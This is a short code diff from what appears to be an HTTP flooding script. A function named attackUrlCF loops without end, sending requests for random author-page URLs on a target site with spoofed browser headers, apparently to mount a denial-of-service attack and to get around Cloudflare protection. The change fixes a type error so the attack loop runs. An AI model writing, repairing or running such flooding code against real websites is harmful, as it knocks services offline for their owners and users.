@@ -90,7 +90,7 @@ def attackUrlCF(baseUrl, threadNumber):
 	while True:
 		try:
 			# url = baseUrl + '/' + ''.join(random.choice(letters) for i in range(10)) 
-			url = baseUrl + '/author/jimmyaki/page/' + random.randint(1,50)
+			url = baseUrl + '/author/jimmyaki/page/' + str(random.randint(1,50))
 
 			headers={'User-Agent': userAgent,
 			'Accept-Language': 'en-US,en;q=0.9',
